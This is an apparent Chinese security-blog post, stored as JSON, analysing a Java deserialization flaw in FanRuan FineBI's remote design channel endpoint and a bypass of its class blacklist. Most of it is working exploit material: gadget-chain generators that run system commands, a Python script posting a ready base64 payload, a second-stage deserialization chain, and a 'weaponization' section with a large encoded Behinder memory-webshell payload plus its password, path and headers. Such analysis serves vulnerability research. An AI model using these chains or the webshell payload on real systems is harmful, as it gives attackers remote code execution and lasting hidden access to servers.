          // 获取Response                    final Object getResponse = request.getClass().getDeclaredMethod(\"getResponse\").invoke(request, new Object[0]);                    System.out.println(getResponse.getClass().getName());                    // 执行doWrite                    Class&lt;?&gt; aClass = Class.forName(\"org.apache.tomcat.util.buf.ByteChunk\");                    Object ByteChunk = aClass.newInstance();                    Method setBytes = aClass.getMethod(\"setBytes\", byte[].class, Integer.TYPE, Integer.TYPE);                    String str = \"6p6p6p6p6p6p6p\";                    setBytes.invoke(ByteChunk, str.getBytes(StandardCharsets.UTF_8), 0 ,str.length());                    getResponse.getClass().getMethod(\"doWrite\", ByteChunk.getClass()).invoke(getResponse, ByteChunk);                &#125;            &#125;        &#125;    &#125;    @Override    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException &#123;    &#125;    @Override    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException &#123;    &#125;    public static void main(String[] args) &#123;    &#125;&#125;\n\n序列化，在demo上进行利用\n\n\n\n\n\n\n\n在帆软5.1.18上进行利用\n\n\n\n\n\n\n\n","categories":["代码审计","漏洞分析"],"tags":["java代码审计"]},{"title":"帆软channel接口反序列化漏洞分析","url":"/2024/03/06/%E5%B8%86%E8%BD%AFchannel%E6%8E%A5%E5%8F%A3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/","content":"环境fineBi 5.1.0\nfineBi5.1.18（绕过）\n漏洞分析漏洞接口为/webroot/decision/remote/design/channel，在fine-decision-report-10.0.jar中，接口对应com.fr.decision.extension.report.api.remote.RemoteDesignResource类的onMessage方法。\n在onMessage方法中，获取request中的输入流，以此作为参数调用WorkContext.handleMessage方法。\n\n\n\n\n\n\n\n在com.fr.workspace.WorkContext的handleMessage方法中，调用了messageListener.handleMessage(var0)。\n\n\n\n\n\n\n\n会调用到com.fr.workspace.engine.rpc.WorkspaceServerInvoker的handleMessage方法，在该方法中调用当前类的deserializeInvocation方法。\n\n\n\n\n\n\n\n在deserializeInvocation方法中，调用了SerializerHelper.deserialize来对request输入流进行反序列化，传入两个参数，一个是输入流，一个是Serializer对象。\n\n\n\n\n\n\n\nSerializer对象是通过以InvocationSerializer.getDefault()作为参数调用GZipSerializerWrapper.wrap方法获取。\nInvocationSerializer.getDefault()方法是创建InvocationSerializer对象。\n\n\n\n\n\n\n\nGZipSerializerWrapper.wrap方法是创建GZipSerializerWrapper对象，并且将InvocationSerializer对象作为this.serializer的值。\n\n\n\n\n\n\n\n接着调用SerializerHelper.deserialize来对request输入流进行反序列化，这里的var1为GZipSerializerWrapper对象，将会调用GZipSerializerWrapper的deserialize方法。\n\n\n\n\n\n\n\n在com.fr.serialization.GZipSerializerWrapper的deserialize方法中，会调用this.serializer的deserialize方法，这里的this.serializer为InvocationSerializer对象。\n\n\n\n\n\n\n\n最终会调用com.fr.rpc.serialization.InvocationSerializer的deserialize方法，var1为request输入流，调用了readObject进行反序列化。\n\n\n\n\n\n\n\ninputstream输入流在com.fr.serialization.GZipSerializerWrapper的deserialize方法中会被包装成GZIPInputStream对象，在发送数据的时候需要将inputstream进行GZIP编码。\n利用链在fine-bi-engine-third-5.1.jar包中集成了CB链依赖\n\n\n\n\n\n\n\n生成利用链\npackage org.example;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import javassist.ClassPool;import javassist.CtClass;import javassist.CtConstructor;import org.apache.commons.beanutils.BeanComparator;import java.io.*;import java.lang.reflect.Field;import java.util.Base64;import java.util.PriorityQueue;import java.util.zip.GZIPInputStream;import java.util.zip.GZIPOutputStream;public class CB_not_cc &#123;    public static void main(String[] args) throws Exception&#123;        TemplatesImpl templates = new TemplatesImpl();        Class&lt;? extends TemplatesImpl&gt; templatesClass = templates.getClass();        Field name = templatesClass.getDeclaredField(\"_name\");        name.setAccessible(true);        name.set(templates, \"aaa\");        Field bytecodes = templatesClass.getDeclaredField(\"_bytecodes\");        bytecodes.setAccessible(true);        // 自定义类        ClassPool pool = ClassPool.getDefault();        String clazzName = \"onload\";        CtClass targetClass = pool.makeClass(clazzName);        targetClass.setSuperclass(pool.get(\"com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet\"));        CtConstructor cons = new CtConstructor(new CtClass[] &#123;&#125;, targetClass);        cons.setBody(\"&#123;Runtime.getRuntime().exec(\\\"calc\\\");&#125;\");        targetClass.addConstructor(cons);        byte[] byteArray = targetClass.toBytecode();        byte[][] payloads = &#123;byteArray&#125;;        bytecodes.set(templates, payloads);        Field tfactory = templatesClass.getDeclaredField(\"_tfactory\");        tfactory.setAccessible(true);        tfactory.set(templates, new TransformerFactoryImpl());        BeanComparator beanComparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);        PriorityQueue&lt;Object&gt; queue = new PriorityQueue&lt;Object&gt;(2, beanComparator);        queue.add(\"a\");        queue.add(\"b\");        Class&lt;? extends BeanComparator&gt; beanComparatorClass = beanComparator.getClass();        Field property = beanComparatorClass.getDeclaredField(\"property\");        property.setAccessible(true);        property.set(beanComparator, \"outputProperties\");        Class&lt;? extends PriorityQueue&gt; queueClass = queue.getClass();        Field queue1 = queueClass.getDeclaredField(\"queue\");        queue1.setAccessible(true);        queue1.set(queue, new Object[]&#123;templates,templates&#125;);        // 序列化        ByteArrayOutputStream baos = new ByteArrayOutputStream();        ObjectOutputStream oos = new ObjectOutputStream(baos);        oos.writeObject(queue);                // 包装成ZIP        final ByteArrayOutputStream baos3 = new ByteArrayOutputStream();        final GZIPOutputStream gos3 = new GZIPOutputStream(baos3);        gos3.write(baos.toByteArray());        gos3.finish();        String base64str = Base64.getEncoder().encodeToString(baos3.toByteArray());        System.out.println(base64str);        // 执行反序列化        final ByteArrayInputStream bais = new ByteArrayInputStream(Base64.getDecoder().decode(base64str));        final GZIPInputStream gis = new GZIPInputStream(bais);        ObjectInputStream ois = new ObjectInputStream(gis);        ois.readObject();            &#125;&#125;\n\n\n\n\n\n\n\n\n通过py脚本利用\nimport requests,base64host= \"http://172.20.10.190:37799/\"payload = \"H4sIAAAAAAAAAGWTT2sTQRjGn9lNkzRNaxtta70Jgm2FXcWDYMU/DQjBUKst9pBCmGyGuLKZXWdm261gD/0AnvwW9lIQFQ+CVw9614sXjx7EiyBW381G09pd2Jl5Zt73mfc3s7tfMaQVph/wDe7Exg+cZeWHyjdbd2IRi6cfzz//eW1nz4ZVQ077j0QdJS/sRlxxEyqDqXoa6aaRbvWfvpBEACxKfC5UHYdH3LsvHIrrhlI7LcFlGqCdReoNoj48YTv7S9+2LViHXB5iG6yOYqTCSCizZVDJXAMuO+6KUb7skCO5zffKSGUnk89UuRY1qYXUvvE3xMBs015/vL785b0FJJHBeBibKDbLmYUv9GaOKrAp52XaiKNj6RyoJOHk4fjSCCV54CQ6MJ5jFE+cVdGNAm6ErlE7vHb7rdx9dtFGvobRpi/bQpqluNsSqoaxJgVIHQhTIz1poNRsbRnhhW2hDexGY7GBfNMLuKZhpXGg4mqqLdQx1JS8K1I6uTommv9XcPhwBnp2OPhNT6x6Rrd+zUx2Op8u9VjQFCPdaizufp/+kS+ufu7LzHu3//oNTV/ADEM+lEHI2wUwhuuEyCVELiFyM0RuD5H7F5HbQ+SqWBq/K9wbLU3Fe2a1T6AAmzJe8aVvrjLYs3P3GHJVIkETZQwhX0IRwwwTAwh3s1QFjDCUOsL0xwyTs3P1I8sWyhjFWAllHKPMHg+8IiaoJxLhMZydPXqfDiYhdp4g5GUcx4k0ySR5roSx8sRNPyDPkQyGk4bgNCykl4eI0Uubp2+BRqdIZ9SOzb9E6RXGK5UXmFrb66+cTn8YnKSraHPOo02GJD3Z0eQPQVjlt6IDAAA=\"data = base64.b64decode(payload)res = requests.post(url=host+\"/webroot/decision/remote/design/channel\", data=data,verify=False, proxies=&#123;\"http\": \"http:127.0.0.1:8080\"&#125;)print(res.text)\n\n不过这里发现一个问题，当使用commons-beanutils 1.9.2 生成反序列化数据提交不会利用成功，通过arthas调试会发现报错java.io.InvalidClassException: org.apache.commons.beanutils.BeanComparator; local class incompatible: stream classdesc serialVersionUID = -2044202215314119608, local class serialVersionUID = -3490850999041592962，这是由于commons-beanutils版本跟帆软环境中的不一致造成的，将生成序列化数据的环境从1.9.2换到1.8.3即可。\n\n\n\n\n\n\n\n修复方式在5.1.18版本中，InputStream对象已被JDKSerializer.CustomObjectInputStream类重新封装。\n\n\n\n\n\n\n\n重写了resolveClass方法，如果被序列化的类名在BLACK_SET变量中，则不会进行序列化。\n\n\n\n\n\n\n\n从/com/fr/serialization/blacklist.txt中得到禁止类序列化的名单。\n\n\n\n\n\n\n\n在fine-core-10.0.jar中的com.fr.serialization.blacklist.txt路径下\n\n\n\n\n\n\n\n二次反序列化绕过限制通过blacklist.txt黑名单可以看到，常规利用链都已经在黑名单中，那么真的就没有办法进行利用了吗？根据师傅们的高见，得知可以利用SignedObject 类进行反序列化绕过黑名单中的类名再次反序列化进行利用，俗称二次反序列化。\n在java.security.SignedObject类中存在一个getObject方法，这个方法会this.content变量进行反序列化。\n\n\n\n\n\n\n\n而SignedObject类的构造方法会将传入的object对象进行序列化，并赋值给this.content变量。\n\n\n\n\n\n\n\n那么通过SignedObject这个类，可以将某个利用链，如CB链触发点PriorityQueue对象，作为参数传递进去，再找到一条路径调用getObject方法，便可以实现二次反序列化。\ngetObject属于getter方法，在fastjson中，对一个类进行序列化会自动调用该类的静态代码块、构造方法、getter方法。\n\n\n\n\n\n\n\n但是在帆软环境中是没有fastjson依赖的，帆软中对json的处理是使用的jackson；在jackson中序列化一个类也有着类似的效果。\n\n\n\n\n\n\n\n在com.fr.third.fasterxml.jackson.databind.node.InternalNodeMapper类中，nodeToString方法和nodeToPrettyString方法都调用了writeValueAsString对JsonNode进行序列化。\n\n\n\n\n\n\n\n而在com.fr.third.fasterxml.jackson.databind.node.BaseJsonNode的toString和toPrettyString方法中也对如上两个方法分别进行调用；this代表所传入进行序列化的对象是当前调用的对象，当BaseJsonNode对象和继承了BaseJsonNode的对象调用到toString方法，就会调用InternalNodeMapper.nodeToPrettyString(this)对当前调用的对象进行序列化，自动调用getter方法。\n\n\n\n\n\n\n\nBaseJsonNode类被18个子类继承。\n\n\n\n\n\n\n\n在这个18个子类中，只有POJONode类的构造方法能传入Object对象。\n\n\n\n\n\n\n\n这里，我们将SignedObject对象作为参数，创建一个POJONode对象，并调用其toString方法，并在SignedObject的getObject中打上断点，运行便调用到了该方法。\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n调用栈\ngetObject:177, SignedObject (java.security)invoke0:-1, NativeMethodAccessorImpl (sun.reflect)invoke:62, NativeMethodAccessorImpl (sun.reflect)invoke:43, DelegatingMethodAccessorImpl (sun.reflect)invoke:498, Method (java.lang.reflect)serializeAsField:690, BeanPropertyWriter (com.fr.third.fasterxml.jackson.databind.ser)serializeFields:755, BeanSerializerBase (com.fr.third.fasterxml.jackson.databind.ser.std)serialize:178, BeanSerializer (com.fr.third.fasterxml.jackson.databind.ser)defaultSerializeValue:1119, SerializerProvider (com.fr.third.fasterxml.jackson.databind)serialize:115, POJONode (com.fr.third.fasterxml.jackson.databind.node)serialize:39, SerializableSerializer (com.fr.third.fasterxml.jackson.databind.ser.std)serialize:20, SerializableSerializer (com.fr.third.fasterxml.jackson.databind.ser.std)_serialize:481, DefaultSerializerProvider (com.fr.third.fasterxml.jackson.databind.ser)serializeValue:320, DefaultSerializerProvider (com.fr.third.fasterxml.jackson.databind.ser)serialize:1517, ObjectWriter$Prefetch (com.fr.third.fasterxml.jackson.databind)_writeValueAndClose:1218, ObjectWriter (com.fr.third.fasterxml.jackson.databind)writeValueAsString:1087, ObjectWriter (com.fr.third.fasterxml.jackson.databind)nodeToString:30, InternalNodeMapper (com.fr.third.fasterxml.jackson.databind.node)toString:136, BaseJsonNode (com.fr.third.fasterxml.jackson.databind.node)main:84, Test (example)\n\n将SignedObject封装在POJONode类中，调用其toString方法，便触发了SignedObject的getObject方法。为了在执行反序列化readObject中调用到POJONode的toString方法，接下来还需要找到一条直接或间接的点能够触发POJONode的toString方法的点。\n在javax.management.BadAttributeValueExpException的readObject方法中，调用了toString方法。\n\n\n\n\n\n\n\n并且this.val可通过构造方法进行传递。\n\n\n\n\n\n\n\n将POJONode对象封装在BadAttributeValueExpException中，可直接进行触发。\n\n\n\n\n\n\n\n但是不幸的是，该链在某个版本已经遭遇黑名单的残害了；不过还存在一个点，在org.apache.commons.collections.bag.TreeBag的readObject方法中，创建了TreeMap对象传入，调用了父类的doReadObject方法。\n\n\n\n\n\n\n\ndoReadObject方法调用了TreeMap的put方法\n\n\n\n\n\n\n\nTreeMap的put方法中调用了compare对key值进行比较，这里的comparator对象可以在创建TreeBag对象时传入，那么可以在创建TreeBag对象时，通过传入指定comparator对象，执行反序列化时就会自动调用comparator对象的compare方法。\n\n\n\n\n\n\n\n那么在org.freehep.util.VersionComparator的compare方法中，调用了toString方法。\n\n\n\n\n\n\n\n不过VersionComparator这个类并没有继承Serializable反序列化接口，不能进行序列化。\n\n\n\n\n\n\n\n到这儿就完了吗？并没有，有时候不得不佩服师傅们的智慧。在com.fr.base.ClassComparator这个类中，可指定类名创建ClassComparator对象，在执行compare方法时，会反射加载指定的类名，并调用其compare方法，关键的是继承了Serializable接口。\n\n\n\n\n\n\n\n所以这里选择将VersionComparator类的包名org.freehep.util.VersionComparator作为参数创建ClassComparator对象，最后再将ClassComparator对象作为创建TreeBag对象的参数，执行反序列化时，就会调用到ClassComparator的compare方法。\n调用链最终的调用链如下。\norg.apache.commons.collections.bag.TreeBag#readObject\tjava.util.TreeMap#put\t\tjava.util.TreeMap#compare\t\t\tcom.fr.base.ClassComparator#compare\t\t\t\torg.freehep.util.VersionComparator#compare\t\t\t\t\tcom.fr.third.fasterxml.jackson.databind.node.POJONode#toString\t\t\t\t\t\tjava.security.SignedObject#getObject\t\t\t\t\t\t\t// 二次反序列化利用CB链\n\n坑点在构造利用链的时候遇到的一些问题。\nadd添加POJONode对象坑点在序列化TreeBag类的时候，需要add添加被触发的POJONode对象，但是执行add会提前触发漏洞执行，为了防止提前触发漏洞，需要先add一个无关紧要的对象，然后再通过反射修改数据为POJONode对象。\nfinal Class&lt;?&gt; superclass = treeBag.getClass().getSuperclass();final Field map = superclass.getDeclaredField(\"map\");map.setAccessible(true);final Map treeMap = (Map) map.get(treeBag);final Field root = treeMap.getClass().getDeclaredField(\"root\");root.setAccessible(true);final Map.Entry  mapEnter = (Map.Entry) root.get(treeMap);final Class&lt;? extends Map.Entry&gt; aClass = mapEnter.getClass();final Field key = aClass.getDeclaredField(\"key\");key.setAccessible(true);key.set(mapEnter, node);\n\n执行writeObject会自动触发调用当按照调用链，把整条链子构造出来，执行writeObject序列化的时候，会提前触发调用，并且会报错，导致序列化后的数据不能正常生成。\n\n\n\n\n\n\n\n报错提示\n\n\n\n\n\n\n\n解决办法是将com.fr.third.fasterxml.jackson.databind.node.BaseJsonNode类反射加载，获取到writeReplace方法，移除掉，即可正常生成。\nfinal CtClass ctClass = ClassPool.getDefault().get(\"com.fr.third.fasterxml.jackson.databind.node.BaseJsonNode\");final CtMethod writeReplace = ctClass.getDeclaredMethod(\"writeReplace\");ctClass.removeMethod(writeReplace);ctClass.toClass();\n\n生成exppackage example;import com.fr.base.ClassComparator;import com.fr.third.fasterxml.jackson.databind.node.POJONode ;import javassist.CtMethod;import org.apache.commons.collections.bag.TreeBag;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import javassist.ClassPool;import javassist.CtClass;import javassist.CtConstructor;import org.apache.commons.beanutils.BeanComparator;import java.io.*;import java.lang.reflect.Field;import java.security.KeyPair;import java.security.KeyPairGenerator;import java.security.Signature;import java.security.SignedObject;import java.util.*;import java.util.zip.GZIPOutputStream;public class Test &#123;    public static void main(String[] args) throws Exception&#123;        TemplatesImpl templates = new TemplatesImpl();        Class&lt;? extends TemplatesImpl&gt; templatesClass = templates.getClass();        Field name = templatesClass.getDeclaredField(\"_name\");        name.setAccessible(true);        name.set(templates, \"aaa\");        Field bytecodes = templatesClass.getDeclaredField(\"_bytecodes\");        bytecodes.setAccessible(true);        // 自定义类        ClassPool pool = ClassPool.getDefault();        String clazzName = \"onload\";        CtClass targetClass = pool.makeClass(clazzName);        targetClass.setSuperclass(pool.get(\"com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet\"));        CtConstructor cons = new CtConstructor(new CtClass[] &#123;&#125;, targetClass);        cons.setBody(\"&#123;Runtime.getRuntime().exec(\\\"calc\\\");&#125;\");        targetClass.addConstructor(cons);        byte[] byteArray = targetClass.toBytecode();        byte[][] payloads = &#123;byteArray&#125;;        bytecodes.set(templates, payloads);        Field tfactory = templatesClass.getDeclaredField(\"_tfactory\");        tfactory.setAccessible(true);        tfactory.set(templates, new TransformerFactoryImpl());        BeanComparator beanComparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);        PriorityQueue&lt;Object&gt; queue = new PriorityQueue&lt;Object&gt;(2, beanComparator);        queue.add(\"a\");        queue.add(\"b\");        Class&lt;? extends BeanComparator&gt; beanComparatorClass = beanComparator.getClass();        Field property = beanComparatorClass.getDeclaredField(\"property\");        property.setAccessible(true);        property.set(beanComparator, \"outputProperties\");        Class&lt;? extends PriorityQueue&gt; queueClass = queue.getClass();        Field queue1 = queueClass.getDeclaredField(\"queue\");        queue1.setAccessible(true);        queue1.set(queue, new Object[]&#123;templates,templates&#125;);        final CtClass ctClass = ClassPool.getDefault().get(\"com.fr.third.fasterxml.jackson.databind.node.BaseJsonNode\");        final CtMethod writeReplace = ctClass.getDeclaredMethod(\"writeReplace\");        ctClass.removeMethod(writeReplace);        ctClass.toClass();        // 二次反序列化        KeyPairGenerator kpg = KeyPairGenerator.getInstance(\"DSA\");        kpg.initialize(1024);        KeyPair kp = kpg.generateKeyPair();        final SignedObject dsa = new SignedObject(queue, kp.getPrivate(), Signature.getInstance(\"DSA\"));//        dsa.getObject();        POJONode node = new POJONode(dsa);//        final VersionComparator versionComparator = new VersionComparator();//        versionComparator.compare(node, node);        final ClassComparator classComparator = new ClassComparator(\"org.freehep.util.VersionComparator\");//        classComparator.compare(node, node);        final TreeBag treeBag = new TreeBag(classComparator);        treeBag.add(-1);        // 反射修改 root 属性的key        final Class&lt;?&gt; superclass = treeBag.getClass().getSuperclass();        final Field map = superclass.getDeclaredField(\"map\");        map.setAccessible(true);        final Map treeMap = (Map) map.get(treeBag);        final Field root = treeMap.getClass().getDeclaredField(\"root\");        root.setAccessible(true);        final Map.Entry  mapEnter = (Map.Entry) root.get(treeMap);        final Class&lt;? extends Map.Entry&gt; aClass = mapEnter.getClass();        final Field key = aClass.getDeclaredField(\"key\");        key.setAccessible(true);        key.set(mapEnter, node);        //  序列化        ByteArrayOutputStream baos = new ByteArrayOutputStream();        ObjectOutputStream oos = new ObjectOutputStream(baos);        oos.writeObject(treeBag);        final ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();        final GZIPOutputStream gzipOutputStream = new GZIPOutputStream(byteArrayOutputStream);        gzipOutputStream.write(baos.toByteArray());        gzipOutputStream.finish();        final String encodeToString = Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());        System.out.println(encodeToString);//        // 执行反序列化        final ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());        ObjectInputStream ois = new ObjectInputStream(bais);        ois.readObject();    &#125;&#125;\n\n\n\n\n\n\n\n\n武器化：打内存马帆软 5.1.0 打冰蝎内存马密码: Oknfbivaa地址: /webroot/decision/login请求头: Referer: Reudjmcj脚本类型: JSP内存马类名: org.apache.commons.lang.AbstractMatcherSjpListener注入器类名: ch.qos.logbacke.StringUtil\n\n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